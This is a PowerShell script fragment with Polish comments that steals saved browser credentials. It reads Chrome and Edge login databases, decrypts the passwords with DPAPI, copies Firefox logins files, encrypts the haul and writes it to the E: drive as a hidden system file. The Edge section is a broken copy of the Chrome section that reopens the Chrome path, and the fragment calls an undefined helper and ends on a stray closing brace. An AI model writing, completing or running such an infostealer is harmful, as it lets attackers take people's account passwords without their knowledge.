# Ekstrakcja danych przeglądarek
$browserData = @()

    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    if (Test-Path $chromePath) {
        try {
            # Otwarcie bazy danych Chrome
            Add-Type -Path "E:\System.Data.SQLite.dll"
            $connection = New-Object -TypeName System.Data.SQLite.SQLiteConnection
            $connection.ConnectionString = "Data Source=$chromePath"
            $connection.Open()

            $query = "SELECT origin_url, username_value, password_value FROM logins"
            $command = $connection.CreateCommand()
            $command.CommandText = $query
            $result = $command.ExecuteReader()

            $decryptedPasswords = @()
            while ($result.Read()) {
                # Odszyfrowanie hasła (DPAPI)
                $encryptedBytes = $result.GetValue(2)
                $decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
                    $encryptedBytes,
                    $null,
                    [System.Security.Cryptography.DataProtectionScope]::CurrentUser
                )
                $password = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
                
                $decryptedPasswords += [PSCustomObject]@{
                    URL = $result.GetString(0)
                    Username = $result.GetString(1)
                    Password = $password
                }
            }
            
            $browserData += @{
                Browser = "Chrome"
                Passwords = $decryptedPasswords
            }
        }
        catch {
            Write-Error "Błąd ekstrakcji Chrome: $_"
        }
        finally {
            if ($connection) { $connection.Close() }
        }
    }

    # Edge (podobny mechanizm jak Chrome)
    $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
    if (Test-Path $edgePath) {
       try {
            # Otwarcie bazy danych Chrome
            Add-Type -Path "E:\System.Data.SQLite.dll"
            $connection = New-Object -TypeName System.Data.SQLite.SQLiteConnection
            $connection.ConnectionString = "Data Source=$chromePath"
            $connection.Open()

            $query = "SELECT origin_url, username_value, password_value FROM logins"
            $command = $connection.CreateCommand()
            $command.CommandText = $query
            $result = $command.ExecuteReader()

            $decryptedPasswords = @()
            while ($result.Read()) {
                # Odszyfrowanie hasła (DPAPI)
                $encryptedBytes = $result.GetValue(2)
                $decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
                    $encryptedBytes,
                    $null,
                    [System.Security.Cryptography.DataProtectionScope]::CurrentUser
                )
                $password = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
                
                $decryptedPasswords += [PSCustomObject]@{
                    URL = $result.GetString(0)
                    Username = $result.GetString(1)
                    Password = $password
                }
            }
            
            $browserData += @{
                Browser = "Chrome"
                Passwords = $decryptedPasswords
            }
        }
        catch {
            Write-Error "Błąd ekstrakcji Chrome: $_"
        }
        finally {
            if ($connection) { $connection.Close() }
        }

    }

# Firefox
    # Firefox
    $ffProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory
    foreach ($profile in $ffProfiles) {
        $loginsPath = Join-Path $profile.FullName "logins.json"
        if (Test-Path $loginsPath) {
            try {
                $jsonContent = Get-Content $loginsPath -Raw | ConvertFrom-Json
                $browserData += @{
                    Browser = "Firefox"
                    Profile = $profile.Name
                    Logins = $jsonContent.logins
                }
            }
            catch {
                Write-Error "Błąd ekstrakcji Firefox: $_"
            }
        }
    }

    # Eksport zaszyfrowanych danych
    $encryptedBrowserData = Encrypt-Data -Data ($browserData | ConvertTo-Json -Depth 5)
    $outputPath = "E:\BrowserData_$(Get-Date -Format 'yyyyMMdd_HHmmss').enc"
    $encryptedBrowserData | Out-File $outputPath
    attrib +s +h $outputPath
}
